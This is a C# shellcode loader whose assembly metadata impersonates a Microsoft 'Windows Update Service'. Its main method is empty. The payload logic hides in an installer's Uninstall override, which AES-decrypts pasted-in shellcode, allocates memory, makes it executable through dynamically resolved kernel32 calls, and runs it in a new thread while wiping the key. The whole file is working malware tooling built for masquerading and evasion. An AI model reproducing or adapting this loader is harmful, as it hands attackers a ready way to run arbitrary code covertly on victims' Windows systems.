using System;
using System.Collections;
using System.ComponentModel;
using System.Configuration.Install;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

[assembly: AssemblyTitle("Windows Update Service")]
[assembly: AssemblyDescription("Microsoft Windows Update Component")]
[assembly: AssemblyCompany("Microsoft Corporation")]
[assembly: AssemblyProduct("Microsoft\u00AE Windows\u00AE Operating System")]
[assembly: AssemblyCopyright("\u00A9 Microsoft Corporation. All rights reserved.")]
[assembly: AssemblyVersion("10.0.19041.1")]
[assembly: AssemblyFileVersion("10.0.19041.1")]

public class Program
{
    public static void Main(string[] args)
    {
    }
}

[RunInstaller(true)]
public class Installer1 : Installer
{
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr VirtualAllocDelegate(
        IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate bool VirtualProtectDelegate(
        IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr CreateThreadDelegate(
        IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, IntPtr lpThreadId);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate uint WaitForSingleObjectDelegate(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    static extern IntPtr LoadLibrary(string lpFileName);

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_READWRITE = 0x04;
    const uint PAGE_EXECUTE_READ = 0x20;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint INFINITE = 0xFFFFFFFF;

    static IntPtr ResolveApi(string dllName, string procName)
    {
        IntPtr hModule = LoadLibrary(dllName);
        if (hModule == IntPtr.Zero)
            throw new Exception("LoadLibrary failed for " + dllName);

        IntPtr procAddr = GetProcAddress(hModule, procName);
        if (procAddr == IntPtr.Zero)
            throw new Exception("GetProcAddress failed for " + procName);

        return procAddr;
    }

    static byte[] DecryptShellcode(byte[] cipherText, byte[] key, byte[] iv)
    {
        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            using (var decryptor = aes.CreateDecryptor())
            using (var ms = new MemoryStream(cipherText))
            using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
            using (var output = new MemoryStream())
            {
                cs.CopyTo(output);
                return output.ToArray();
            }
        }
    }

    public override void Uninstall(IDictionary savedState)
    {
        string encryptedShellcodeB64 = "PASTE_CIPHERTEXT_HERE";
        string keyB64 = "PASTE_KEY_HERE";
        string ivB64 = "PASTE_IV_HERE";

        byte[] encryptedShellcode = Convert.FromBase64String(encryptedShellcodeB64);
        byte[] key = Convert.FromBase64String(keyB64);
        byte[] iv = Convert.FromBase64String(ivB64);

        byte[] shellcode = DecryptShellcode(encryptedShellcode, key, iv);

        var virtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(
            ResolveApi("kernel32.dll", "VirtualAlloc"), typeof(VirtualAllocDelegate));

        var virtualProtect = (VirtualProtectDelegate)Marshal.GetDelegateForFunctionPointer(
            ResolveApi("kernel32.dll", "VirtualProtect"), typeof(VirtualProtectDelegate));

        var createThread = (CreateThreadDelegate)Marshal.GetDelegateForFunctionPointer(
            ResolveApi("kernel32.dll", "CreateThread"), typeof(CreateThreadDelegate));

        var waitForSingleObject = (WaitForSingleObjectDelegate)Marshal.GetDelegateForFunctionPointer(
            ResolveApi("kernel32.dll", "WaitForSingleObject"), typeof(WaitForSingleObjectDelegate));

        IntPtr shellcodeRegion = virtualAlloc(
            IntPtr.Zero,
            (uint)shellcode.Length,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE);

        if (shellcodeRegion == IntPtr.Zero) return;

        Marshal.Copy(shellcode, 0, shellcodeRegion, shellcode.Length);

        int scLen = shellcode.Length;
        Array.Clear(shellcode, 0, shellcode.Length);
        Array.Clear(key, 0, key.Length);
        Array.Clear(iv, 0, iv.Length);

        uint oldProtect;
        virtualProtect(shellcodeRegion, (uint)scLen, PAGE_EXECUTE_READ, out oldProtect);

        IntPtr hThread = createThread(
            IntPtr.Zero, 0, shellcodeRegion, IntPtr.Zero, 0, IntPtr.Zero);

        if (hThread == IntPtr.Zero) return;

        waitForSingleObject(hThread, INFINITE);
    }
}
